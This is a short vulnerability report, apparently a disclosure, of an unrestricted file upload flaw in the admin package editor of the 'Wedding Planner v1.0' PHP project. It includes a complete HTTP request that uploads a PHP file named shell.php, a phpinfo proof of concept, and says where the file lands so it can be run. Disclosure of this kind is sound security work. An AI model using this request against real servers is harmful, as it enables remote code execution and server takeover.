# Wedding Planner v1.0 by pushpam02 has arbitrary code execution (RCE)

BUG_Author: Tr0e

vendor: https://www.sourcecodester.com/php/15375/wedding-planner-project-php-free-download.html

Vulnerability url: http://ip/Wedding-Management-PHP/admin/package_edit.php?id=1

Loophole location：The editing function of "Services" module in the background management system-- > there is an arbitrary file upload vulnerability (RCE) in the picture upload point of "package_edit.php" file.

Click "Edit" to save

Request package for file upload：

```sql
POST /Wedding-Management-PHP/admin/package_edit.php?id=1 HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/Wedding-Management-PHP/admin/package_edit.php?id=1
Cookie: PHPSESSID=ncd6h7doujvbbft46r0m7mbr6s
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------2779055672062
Content-Length: 529

-----------------------------2779055672062
Content-Disposition: form-data; name="wedding_type"

2
-----------------------------2779055672062
Content-Disposition: form-data; name="price"

0.00
-----------------------------2779055672062
Content-Disposition: form-data; name="preview_image"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------2779055672062
Content-Disposition: form-data; name="submit"


-----------------------------2779055672062--
```

The files will be uploaded to this directory \Wedding-Management-PHP\admin\upload\categories

![image](https://user-images.githubusercontent.com/54017627/183274220-c9d1fde4-709b-4eea-8a18-9e305b4b9104.png)

We visited the directory of the file in the browser and found that the code had been executed
![image](https://user-images.githubusercontent.com/54017627/183274224-8b9afde9-2cfe-4020-81e6-5c60e2401ed4.png)
